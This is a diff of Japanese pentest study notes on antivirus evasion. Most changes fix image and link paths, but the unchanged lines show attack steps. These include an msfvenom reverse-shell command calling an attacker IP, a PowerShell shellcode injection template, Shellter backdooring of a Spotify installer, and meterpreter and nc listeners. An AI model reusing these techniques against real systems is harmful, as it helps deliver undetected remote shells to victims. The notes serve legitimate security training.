@@ -94,7 +94,7 @@ SecOpsは、企業のIT部門とSOCとの協力体制を指す。SecOpsの目的
 - どのAVを使う場合でも、「サンプル自動送信」の設定は必ず無効にしておく。
     - 例：Windows Defenderの場合
         - 「Windows セキュリティ」 → 「ウイルスと脅威の防止」 → 「設定の管理」から無効化できる。
-![[Pasted image 20250702073235.png]]
+![](../画像ファイル/Pasted%20image%2020250702073235.png)
 $$WindowsDefenderのサンプル自動提供の無効化$$
 
 ### サンプル送信とインターネット接続の関係
@@ -182,7 +182,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[Port] -f psh-ref
 
 ### 3.最終構成コード
 
-1. [Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#1.%20リモートプロセスインジェクションのテンプレートスクリプト)の`<place shellcode here>`に[Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#2.%20シェルコード生成)で生成したシェルコードを注入する。
+1. [Module 16：Antivirus Evasion](#1.%20リモートプロセスインジェクションのテンプレートスクリプト)の`<place shellcode here>`に[Module 16：Antivirus Evasion](#2.%20シェルコード生成)で生成したシェルコードを注入する。
 ```powershell
 $code = '
 [DllImport("kernel32.dll")]
@@ -224,9 +224,9 @@ function xb {
 
 #### 検知されないことを確認
 
-- ターゲット環境のAVソフトで検知があがらないことを確認するため、[Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#理想的なAV回避テスト環境)もしくは[Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#Kleenscanの活用)をし、検知されないことを確認する
+- ターゲット環境のAVソフトで検知があがらないことを確認するため、[Module 16：Antivirus Evasion](#理想的なAV回避テスト環境)もしくは[Module 16：Antivirus Evasion](#Kleenscanの活用)をし、検知されないことを確認する
 - 以下はVirusTotalの画面だが、今回のテストで使用しているAviraは検知ベンダーに記載なし
-![[Pasted image 20250702122439.png]]
+![](../画像ファイル/Pasted%20image%2020250702122439.png)
 $$VirusTotalでAviraは検知していない$$
 
 補足：検知された場合
@@ -314,7 +314,7 @@ sudo rlwrap nc -lvnp 4444
 - ps1ファイルをターゲットユーザーにダブルクリックさせても、スクリプトがメモ帳で開かれるだけで実行はされない
 - 上述のように、PowerShellを開かせ、`\bypass.ps1`とさせる必要がある
 - 通常、ターゲットユーザーにpsスクリプトをPowerShellで実行させることは難しい
-	- → [Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#Veil-frameworkを使ったAV%20evasion)
+	- → [Module 16：Antivirus Evasion](#Veil-frameworkを使ったAV%20evasion)
 
 ---
 ---
@@ -352,7 +352,7 @@ shellter
 ```
 	↓
 
-![[Pasted image 20250704072258.png]]
+![](../画像ファイル/Pasted%20image%2020250704072258.png)
 $$Shellter起動画面$$
 
 #### Shellterのモードについて
@@ -380,25 +380,25 @@ Choose Operation Mode - Auto/Manual (A/M/H):    A
 	- 今回はSpotifyインストーラー（EXE）を選択
 	- ShellterはPEファイルに対し、変更を加える前に自動でバックアップを作成する
 	- ⚠️少し待つ
-![[Pasted image 20250704122954.png]]
+![](../画像ファイル/Pasted%20image%2020250704122954.png)
 $$ターゲットPEの選択・自動バックアップ$$
 
 3. ステルスモードを有効に選択（Y）
 	- ペイロードを実行した後、通常のPEとして振る舞うようにする
-![[Pasted image 20250704124053.png]]
+![](../画像ファイル/Pasted%20image%2020250704124053.png)
 $$StealthModeの選択と有効なペイロード一覧$$
 
 4. 使用するペイロードを選択する
 	- L：リストにあるペイロードを使う
 	- C：自作のペイロードを使う
 	- ここでは1番を選択する。msfvenomのように、LHOST、LPORTの入力が求められる。
-![[Pasted image 20250704124409.png]]
+![](../画像ファイル/Pasted%20image%2020250704124409.png)
 $$ペイロードの選択$$
 
 5. Verification（有効かどうかを検証）する
 	- Info、Warningを読む
 	- Enterを押すとターゲットPEファイルが悪意あるPEファイルに変換される
-![[Pasted image 20250704124644.png]]
+![](../画像ファイル/Pasted%20image%2020250704124644.png)
 $$Verification Stage$$
 
 6. ターゲットに送る前に攻撃者のマシン上でmeterpreterリスナーを立てる
@@ -415,7 +415,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 
 - [Veil-framwork - GitHub](https://github.com/Veil-Framework/Veil)は、一般的なAVをバイパスするmetasploitペイロードを生成するために設計されたツール
 	- ==msfvenomのエンコードだけではバイパスは難しい==
-- [Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#🚨.ps1ファイルの欠点)のように、ユーザーにPowerShellを開かせてps1ファイルを実行させる必要がないことがメリット。
+- [Module 16：Antivirus Evasion](#🚨.ps1ファイルの欠点)のように、ユーザーにPowerShellを開かせてps1ファイルを実行させる必要がないことがメリット。
 
 1. インストール
 ```zsh
@@ -436,7 +436,7 @@ sudo veil
 ```zsh
 use 1
 ```
-![[Pasted image 20250705204358.png]]
+![](../画像ファイル/Pasted%20image%2020250705204358.png)
 $$Veilの起動・Evasionの選択$$
 
 3. PowerShellのbatファイル生成ペイロードを選択
